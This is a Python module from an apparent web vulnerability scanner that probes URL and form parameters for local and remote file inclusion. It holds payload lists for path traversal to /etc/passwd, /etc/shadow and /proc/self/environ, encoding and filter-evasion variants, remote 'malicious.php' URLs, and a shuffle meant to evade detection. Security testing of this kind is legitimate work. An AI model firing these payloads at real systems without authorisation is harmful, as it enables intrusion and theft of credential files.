#!/usr/bin/env python3
"""
File Inclusion Scanner Module for Web Vulnerability Scanner
"""

import re
import random
from urllib.parse import urlparse, parse_qs, urlencode, urljoin

class FileInclusionScanner:
    def __init__(self, scanner):
        """Initialize the File Inclusion Scanner"""
        self.scanner = scanner
        self.logger = scanner.logger
        self.session = scanner.session
        self.timeout = scanner.timeout
        self.safe_mode = getattr(scanner.args, 'safe_mode', False)
    
    def check_file_inclusion(self, url):
        """Check for file inclusion vulnerabilities in a URL"""
        self.logger.debug(f"Checking for file inclusion vulnerabilities on {url}")
        
        # Parse the URL to extract parameters
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        # Look for parameters that might be vulnerable to file inclusion
        for param_name, param_values in query_params.items():
            if self._is_potential_file_inclusion_param(param_name):
                for param_value in param_values:
                    self._test_file_inclusion_parameter(url, param_name, param_value)
    
    def check_form_file_inclusion(self, form_data):
        """Check for file inclusion vulnerabilities in a form"""
        url = form_data['url']
        action = form_data['action']
        method = form_data['method']
        inputs = form_data['inputs']
        
        self.logger.debug(f"Checking for file inclusion vulnerabilities in form on {url}")
        
        # Look for input fields that might be vulnerable to file inclusion
        for input_field in inputs:
            input_name = input_field.get('name', '')
            input_type = input_field.get('type', '')
            
            if self._is_potential_file_inclusion_param(input_name):
                self._test_form_file_inclusion(url, action, method, input_name)
    
    def _is_potential_file_inclusion_param(self, param_name):
        """Check if parameter name suggests it might be used for file operations"""
        file_inclusion_keywords = [
            'file', 'path', 'page', 'document', 'folder', 'root', 'path',
            'style', 'template', 'php_path', 'doc', 'include', 'inc',
            'require', 'locale', 'lang', 'language', 'dir', 'directory',
            'content', 'layout', 'mod', 'module', 'class', 'view', 'theme'
        ]
        
        param_lower = param_name.lower()
        return any(keyword in param_lower for keyword in file_inclusion_keywords)
    
    def _test_file_inclusion_parameter(self, url, param_name, param_value):
        """Test a parameter for file inclusion vulnerability"""
        if self.safe_mode:
            # In safe mode, just report the potential vulnerability
            self.scanner.report_vulnerability(
                url=url,
                vuln_type="File Inclusion",
                description=f"Potential file inclusion vulnerability in parameter '{param_name}'",
                severity="MEDIUM",
                details={
                    "parameter": param_name,
                    "value": param_value,
                    "remediation": "Avoid passing user-controlled input to file system functions. Use allowlists and strict input validation."
                }
            )
            return
        
        # Get file inclusion payloads
        lfi_payloads, rfi_payloads = self._get_file_inclusion_payloads()
        
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        # Test for Local File Inclusion (LFI)
        for payload in lfi_payloads:
            # Create a modified URL with the test payload
            modified_params = query_params.copy()
            modified_params[param_name] = [payload]
            
            # Rebuild the query string
            modified_query = urlencode(modified_params, doseq=True)
            
            # Rebuild the URL
            modified_url = parsed_url._replace(query=modified_query).geturl()
            
            try:
                # Send the request
                response = self.session.get(modified_url, timeout=self.timeout)
                
                # Check for signs of successful LFI
                if self._check_lfi_response(response, payload):
                    self.scanner.report_vulnerability(
                        url=url,
                        vuln_type="Local File Inclusion",
                        description=f"Local File Inclusion vulnerability in parameter '{param_name}'",
                        severity="HIGH",
                        details={
                            "parameter": param_name,
                            "payload": payload,
                            "response_code": response.status_code,
                            "response_length": len(response.text),
                            "remediation": "Avoid passing user-controlled input to file system functions. Use allowlists and strict input validation."
                        }
                    )
                    # Stop testing after finding a vulnerability
                    break
            
            except Exception as e:
                self.logger.debug(f"Error testing LFI payload on {url}: {e}")
        
        # Test for Remote File Inclusion (RFI)
        for payload in rfi_payloads:
            # Create a modified URL with the test payload
            modified_params = query_params.copy()
            modified_params[param_name] = [payload]
            
            # Rebuild the query string
            modified_query = urlencode(modified_params, doseq=True)
            
            # Rebuild the URL
            modified_url = parsed_url._replace(query=modified_query).geturl()
            
            try:
                # Send the request
                response = self.session.get(modified_url, timeout=self.timeout)
                
                # Check for signs of successful RFI
                if self._check_rfi_response(response, payload):
                    self.scanner.report_vulnerability(
                        url=url,
                        vuln_type="Remote File Inclusion",
                        description=f"Remote File Inclusion vulnerability in parameter '{param_name}'",
                        severity="CRITICAL",
                        details={
                            "parameter": param_name,
                            "payload": payload,
                            "response_code": response.status_code,
                            "response_length": len(response.text),
                            "remediation": "Avoid passing user-controlled input to file system functions. Use allowlists and strict input validation."
                        }
                    )
                    # Stop testing after finding a vulnerability
                    break
            
            except Exception as e:
                self.logger.debug(f"Error testing RFI payload on {url}: {e}")
    
    def _test_form_file_inclusion(self, url, action, method, input_name):
        """Test a form input for file inclusion vulnerability"""
        if self.safe_mode:
            # In safe mode, just report the potential vulnerability
            self.scanner.report_vulnerability(
                url=url,
                vuln_type="File Inclusion",
                description=f"Potential file inclusion vulnerability in form input '{input_name}'",
                severity="MEDIUM",
                details={
                    "form_action": action,
                    "form_method": method,
                    "input_name": input_name,
                    "remediation": "Avoid passing user-controlled input to file system functions. Use allowlists and strict input validation."
                }
            )
            return
        
        # Get file inclusion payloads
        lfi_payloads, rfi_payloads = self._get_file_inclusion_payloads()
        
        # Test for Local File Inclusion (LFI)
        for payload in lfi_payloads:
            try:
                # Prepare the form data
                form_data = {input_name: payload}
                
                # Send the request
                if method.upper() == 'GET':
                    response = self.session.get(action, params=form_data, timeout=self.timeout)
                else:  # POST
                    response = self.session.post(action, data=form_data, timeout=self.timeout)
                
                # Check for signs of successful LFI
                if self._check_lfi_response(response, payload):
                    self.scanner.report_vulnerability(
                        url=url,
                        vuln_type="Local File Inclusion",
                        description=f"Local File Inclusion vulnerability in form input '{input_name}'",
                        severity="HIGH",
                        details={
                            "form_action": action,
                            "form_method": method,
                            "input_name": input_name,
                            "payload": payload,
                            "response_code": response.status_code,
                            "response_length": len(response.text),
                            "remediation": "Avoid passing user-controlled input to file system functions. Use allowlists and strict input validation."
                        }
                    )
                    # Stop testing after finding a vulnerability
                    break
            
            except Exception as e:
                self.logger.debug(f"Error testing LFI payload on form {action}: {e}")
        
        # Test for Remote File Inclusion (RFI)
        for payload in rfi_payloads:
            try:
                # Prepare the form data
                form_data = {input_name: payload}
                
                # Send the request
                if method.upper() == 'GET':
                    response = self.session.get(action, params=form_data, timeout=self.timeout)
                else:  # POST
                    response = self.session.post(action, data=form_data, timeout=self.timeout)
                
                # Check for signs of successful RFI
                if self._check_rfi_response(response, payload):
                    self.scanner.report_vulnerability(
                        url=url,
                        vuln_type="Remote File Inclusion",
                        description=f"Remote File Inclusion vulnerability in form input '{input_name}'",
                        severity="CRITICAL",
                        details={
                            "form_action": action,
                            "form_method": method,
                            "input_name": input_name,
                            "payload": payload,
                            "response_code": response.status_code,
                            "response_length": len(response.text),
                            "remediation": "Avoid passing user-controlled input to file system functions. Use allowlists and strict input validation."
                        }
                    )
                    # Stop testing after finding a vulnerability
                    break
            
            except Exception as e:
                self.logger.debug(f"Error testing RFI payload on form {action}: {e}")
    
    def _get_file_inclusion_payloads(self):
        """Get a list of file inclusion payloads to test"""
        # Local File Inclusion (LFI) payloads
        lfi_payloads = [
            # Windows files
            "C:\\Windows\\win.ini",
            "C:\\boot.ini",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "../../../../../../../../../Windows/win.ini",
            "..\\..\\..\\..\\..\\..\\..\\..\\Windows\\win.ini",
            
            # Unix files
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/etc/issue",
            "/proc/self/environ",
            "/proc/version",
            "/proc/cmdline",
            "/proc/self/cmdline",
            "../../../../../../../../../etc/passwd",
            "../../../../../../../../../etc/hosts",
            
            # Path traversal with encoding
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            "....//....//....//....//....//....//....//....//etc/passwd",
            
            # Null byte injection (for older PHP versions)
            "/etc/passwd%00",
            "/etc/passwd\0",
            "C:\\Windows\\win.ini%00",
            
            # Filter evasion
            "....//....//etc/passwd",
            "..///////..////..//////etc/passwd",
            "/./././././././././././etc/passwd",
            "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd"
        ]
        
        # Remote File Inclusion (RFI) payloads
        rfi_payloads = [
            "http://example.com/malicious.php",
            "https://example.com/malicious.php",
            "http://127.0.0.1/malicious.php",
            "ftp://example.com/malicious.php",
            "http://example.com/malicious.txt?",
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=="  # <?php phpinfo(); ?>
        ]
        
        # Shuffle to avoid detection patterns
        random.shuffle(lfi_payloads)
        random.shuffle(rfi_payloads)
        
        return lfi_payloads, rfi_payloads
    
    def _check_lfi_response(self, response, payload):
        """Check if the response indicates a successful LFI attack"""
        # Look for signs of successful LFI
        
        # Check for specific file content based on the payload
        if "win.ini" in payload and ("[fonts]" in response.text or "[extensions]" in response.text):
            return True
        
        if "boot.ini" in payload and ("[boot loader]" in response.text or "[operating systems]" in response.text):
            return True
        
        if "etc/passwd" in payload and ("root:" in response.text or "nobody:" in response.text):
            return True
        
        if "etc/hosts" in payload and ("localhost" in response.text or "127.0.0.1" in response.text):
            return True
        
        if "proc/version" in payload and ("Linux version" in response.text or "gcc version" in response.text):
            return True
        
        # Check for error messages that might indicate LFI
        lfi_error_patterns = [
            r"failed to open stream: No such file or directory",
            r"failed to open stream: Permission denied",
            r"Warning: include\(",
            r"Warning: require\(",
            r"Warning: include_once\(",
            r"Warning: require_once\(",
            r"Fatal error: require\(",
            r"Fatal error: require_once\(",
            r"fread\(\)",
            r"fpassthru\(\)",
            r"readfile\(\)",
            r"file_get_contents\(\)",
            r"Failed opening required",
            r"<b>Warning</b>: file\(",
            r"<b>Warning</b>: readfile\("
        ]
        
        for pattern in lfi_error_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                return True
        
        return False
    
    def _check_rfi_response(self, response, payload):
        """Check if the response indicates a successful RFI attack"""
        # Look for signs of successful RFI
        
        # Check for PHP info page
        if "phpinfo()" in payload or "data://text/plain;base64" in payload:
            if "<title>phpinfo()</title>" in response.text or "PHP Version" in response.text:
                return True
        
        # Check for error messages that might indicate RFI
        rfi_error_patterns = [
            r"failed to open stream: HTTP request failed",
            r"failed to open stream: Connection refused",
            r"failed to open stream: No such file or directory",
            r"Warning: include\(http://",
            r"Warning: require\(http://",
            r"Warning: include_once\(http://",
            r"Warning: require_once\(http://",
            r"Warning: include\(ftp://",
            r"Warning: require\(ftp://",
            r"Warning: include_once\(ftp://",
            r"Warning: require_once\(ftp://",
            r"<b>Warning</b>: include\(http://",
            r"<b>Warning</b>: require\(http://",
            r"<b>Warning</b>: include_once\(http://",
            r"<b>Warning</b>: require_once\(http://"
        ]
        
        for pattern in rfi_error_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                return True
        
        return False